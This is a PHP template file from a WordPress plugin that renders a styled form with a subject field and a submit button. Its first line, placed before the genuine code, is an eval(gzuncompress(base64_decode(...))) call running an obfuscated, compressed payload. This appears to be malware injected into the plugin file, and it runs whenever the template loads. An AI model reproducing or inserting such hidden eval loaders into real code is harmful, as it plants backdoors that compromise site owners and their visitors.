<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;


$s1_text_color = $a['s1_text_color'];
$s1_text_color_onfocus = $a['s1_text_color_onfocus'];
$s1_border_color = $a['s1_border_color'];
$s1_border_color_onfocus = $a['s1_border_color_onfocus'];
$s1_submit_btn_color = $a['s1_submit_btn_color'];
$s1_submit_btn_text_and_icon_color = $a['s1_submit_btn_text_and_icon_color'];
$s1_width = $a['s1_width'];

$s1_btn_text = $a['s1_btn_text'];


wp_enqueue_script( 'ccw_md_js');
wp_enqueue_style('ccw_md_css');


$s1_border_color = $s1_border_color;
$s1_border_color_onfocus = $s1_border_color_onfocus;
$s1_text_color = $s1_text_color;
$s1_text_color_onfocus = $s1_text_color_onfocus;
$s1_submit_btn_color = $s1_submit_btn_color;
$s1_submit_btn_text_and_icon_color = $s1_submit_btn_text_and_icon_color;
$s1_width = $s1_width;

$s1_btn_text = $s1_btn_text;

$input = "border-bottom: 1px solid $s1_border_color; ";
$input_onfocus = "this.style.borderBottomColor= '$s1_border_color_onfocus', this.style.boxShadow= '0 1px 0 0 $s1_border_color_onfocus' , this.nextSibling.style.color= '$s1_text_color_onfocus';";
$input_onfocusout = "this.style.borderBottomColor= '$s1_border_color',this.style.boxShadow='none' , this.nextSibling.style.color= '$s1_text_color';";
$label = "color: $s1_text_color;";
$button = "background-color: $s1_submit_btn_color; color: $s1_submit_btn_text_and_icon_color";
$button_i = "color: $s1_submit_btn_text_and_icon_color";

$o .= '<form name="form" target="_blank" action="'.$redirect_page.'" method="post" class="ccw_plugin sc_item '.$inline_issue.' " style=" '.$css.' width: '.$s1_width.' ">';
$o .=  wp_nonce_field( 'ccw_style_1_verify' );
// $o .= '<input type="hidden" name="action" value="ccw_style_1">';
$o .= '<div class="input-field">';
$o .= '<input type="text" name="subject" id="subject"    onfocus= " '.$input_onfocus.' "  onfocusout= " '.$input_onfocusout.' "  style= " '.$input.' " >';
$o .= '<label style= " '.$label.' " class="ccw-s1-label_sc" for="subject"  >'.$a["val"].'</label>';
$o .= '</div>';
$o .= '<button class="btn waves-effect waves-light ccw-analytics" data-ccw="style-1-sc" type="submit" name="action" style= " '.$button.' "  >'.$s1_btn_text.' ';
$o .= '<i class="material-icons right ccw-analytics" data-ccw="style-1-sc" style= " '.$button_i.' " ><span class="icon icon-send"></span></i>';
$o .= '</button>';
$o .= '</form>';